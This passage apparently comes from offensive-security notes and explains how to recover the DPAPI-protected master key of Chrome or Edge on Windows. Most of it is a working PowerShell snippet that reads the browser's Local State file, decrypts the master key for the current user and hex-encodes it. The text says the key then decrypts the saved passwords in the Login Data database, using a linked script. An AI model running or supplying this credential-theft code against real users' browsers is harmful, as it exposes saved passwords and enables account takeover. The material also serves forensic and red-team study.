...
### Unprotect strict using DAPI

Chromium based browsers (Google Chrome, Edge, ...) on Windows use DAPI to encrypt
the master key within the user session. It's possible to use PowerShell (or the
Win32API) to recover the master key. With this master key you can decrypt the
saved passwords from the sqlite database using [this script](./assets/chrome_passwords.py)

```powershell
Add-Type -AssemblyName System.Security

$chrome_dir = $env:LOCALAPPDATA + "\\Google\\Chrome\\User Data"
# $chrome_dir = $env:LOCALAPPDATA + "\\Microsoft\\Edge\\User Data"
$chrome_local_state_path = $chrome_dir + "\\Local State"
$chrome_default_db_path = $chrome_dir + "\\Default\\Login Data"

# Read the encrypted master key from the config file
$local_state = Get-Content -Raw -Path $chrome_local_state_path
$r = $local_state -match '"os_crypt":{"encrypted_key":"(.*?)"},"password_manager":{'
$raw_master_key = $Matches[1]

# Decrypt the master key
$raw_master_key = [Convert]::FromBase64String($raw_master_key)
$master_key = [System.Byte[]]::CreateInstance([System.Byte], $raw_master_key.Length-5)
For ($i=0; $i -lt $raw_master_key.length-5; $i++) { $master_key[$i] = $raw_master_key[$i+5] }
$master_key = [System.Security.Cryptography.ProtectedData]::Unprotect($master_key, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
$master_key_hex = ($master_key | ForEach-Object ToString X2) -join ''
```
